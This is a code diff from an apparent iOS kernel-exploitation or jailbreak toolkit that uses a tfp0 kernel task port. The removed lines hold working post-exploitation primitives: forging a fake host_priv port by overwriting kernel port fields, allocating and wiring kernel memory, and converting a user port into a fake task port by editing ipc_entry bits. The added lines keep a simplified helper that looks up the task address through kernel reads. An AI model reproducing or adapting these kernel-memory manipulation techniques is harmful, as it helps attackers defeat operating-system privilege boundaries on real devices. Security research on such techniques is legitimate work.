@@ -32,124 +32,31 @@ void kfree(mach_vm_address_t address, vm_size_t size) {
     mach_vm_deallocate(tfpzero, address, size);
 }
 
-uint64_t task_self_addr() {
+CACHED_FIND(uint64_t, our_task_addr) {
+    uint64_t our_proc = proc_for_pid(getpid());
     
-    uint64_t selfproc = proc_for_pid(getpid());
-    if (selfproc == 0) {
-        fprintf(stderr, "failed to find our task addr\n");
+    if (our_proc == 0) {
+        fprintf(stderr,"failed to find our_task_addr!\n");
         exit(EXIT_FAILURE);
     }
-    uint64_t addr = kread64(selfproc + offsetof_task);
     
-    uint64_t task_addr = addr;
-    uint64_t itk_space = kread64(task_addr + offsetof_itk_space);
-    
-    uint64_t is_table = kread64(itk_space + offsetof_ipc_space_is_table);
-    
-    uint32_t port_index = mach_task_self() >> 8;
-    const int sizeof_ipc_entry_t = 0x18;
-    
-    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
-    
-    return port_addr;
-}
-
-uint64_t ipc_space_kernel() {
-    return kread64(task_self_addr() + 0x60);
+    uint64_t addr = kread64(our_proc + offsetof_task);
+    fprintf(stderr,"our_task_addr: 0x%llx\n", addr);
+    return addr;
 }
 
 uint64_t find_port_address(mach_port_name_t port) {
-   
-    uint64_t task_port_addr = task_self_addr();
-    //uint64_t task_addr = task_self_addr();
-    uint64_t task_addr = kread64(task_port_addr + offsetof_ip_kobject);
+    uint64_t task_addr = our_task_addr();
+    
     uint64_t itk_space = kread64(task_addr + offsetof_itk_space);
     
     uint64_t is_table = kread64(itk_space + offsetof_ipc_space_is_table);
     
     uint32_t port_index = port >> 8;
     const int sizeof_ipc_entry_t = 0x18;
-
+    
     uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t));
-
     return port_addr;
-}
-
-mach_port_t fake_host_priv_port = MACH_PORT_NULL;
-
-// build a fake host priv port
-mach_port_t fake_host_priv() {
-    if (fake_host_priv_port != MACH_PORT_NULL) {
-        return fake_host_priv_port;
-    }
-    // get the address of realhost:
-    uint64_t hostport_addr = find_port_address(mach_host_self());
-    uint64_t realhost = kread64(hostport_addr + offsetof_ip_kobject);
-    
-    // allocate a port
-    mach_port_t port = MACH_PORT_NULL;
-    kern_return_t err;
-    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
-    if (err != KERN_SUCCESS) {
-        printf("failed to allocate port\n");
-        return MACH_PORT_NULL;
-    }
-    // get a send right
-    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
-    
-    // locate the port
-    uint64_t port_addr = find_port_address(port);
-    
-    // change the type of the port
-#define IKOT_HOST_PRIV 4
-#define IO_ACTIVE   0x80000000
-    kwrite32(port_addr + 0, IO_ACTIVE|IKOT_HOST_PRIV);
-    
-    // change the space of the port
-    kwrite64(port_addr + 0x60, ipc_space_kernel());
-    
-    // set the kobject
-    kwrite64(port_addr + offsetof_ip_kobject, realhost);
-    
-    fake_host_priv_port = port;
-    
-    return port;
-}
-
-uint64_t kmem_alloc_wired(uint64_t size) {
-    if (tfpzero == MACH_PORT_NULL) {
-        printf("attempt to allocate kernel memory before any kernel memory write primitives available\n");
-        sleep(3);
-        return 0;
-    }
-    
-    kern_return_t err;
-    mach_vm_address_t addr = 0;
-    mach_vm_size_t ksize = round_page_kernel(size);
-    
-    printf("vm_kernel_page_size: %lx\n", vm_kernel_page_size);
-    
-    err = mach_vm_allocate(tfpzero, &addr, ksize+0x4000, VM_FLAGS_ANYWHERE);
-    if (err != KERN_SUCCESS) {
-        printf("unable to allocate kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
-        sleep(3);
-        return 0;
-    }
-    
-    printf("allocated address: %llx\n", addr);
-    
-    addr += 0x3fff;
-    addr &= ~0x3fffull;
-    
-    printf("address to wire: %llx\n", addr);
-    
-    err = mach_vm_wire(fake_host_priv(), tfpzero, addr, ksize, VM_PROT_READ|VM_PROT_WRITE);
-    if (err != KERN_SUCCESS) {
-        printf("unable to wire kernel memory via tfp0: %s %x\n", mach_error_string(err), err);
-        sleep(3);
-        return 0;
-    }
-    return addr;
 }
 
 
@@ -221,39 +128,6 @@ void kmemcpy(uint64_t dest, uint64_t src, uint32_t length) {
         // copy from kernel
         kread(src, (void*)dest, length);
     }
-}
-
-void convert_port_to_task_port(mach_port_t port, uint64_t space, uint64_t task_kaddr) {
-    // now make the changes to the port object to make it a task port:
-    uint64_t port_kaddr = find_port_address(port);
-    
-    kwrite32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), 0x80000000 | 2);
-    kwrite32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
-    kwrite32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS), 0xf00d);
-    kwrite64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), space);
-    kwrite64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  task_kaddr);
-    
-    // swap our receive right for a send right:
-    uint64_t task_port_addr = task_self_addr();
-    uint64_t task_addr = kread64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    uint64_t itk_space = kread64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-    uint64_t is_table = kread64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
-    
-    uint32_t port_index = port >> 8;
-    const int sizeof_ipc_entry_t = 0x18;
-    uint32_t bits = kread32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
-    
-#define IE_BITS_SEND (1<<16)
-#define IE_BITS_RECEIVE (1<<17)
-    
-    bits &= (~IE_BITS_RECEIVE);
-    bits |= IE_BITS_SEND;
-    
-    kwrite32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
-}
-
-void make_port_fake_task_port(mach_port_t port, uint64_t task_kaddr) {
-    convert_port_to_task_port(port, ipc_space_kernel(), task_kaddr);
 }
 
 uint64_t proc_for_pid(pid_t pid) {
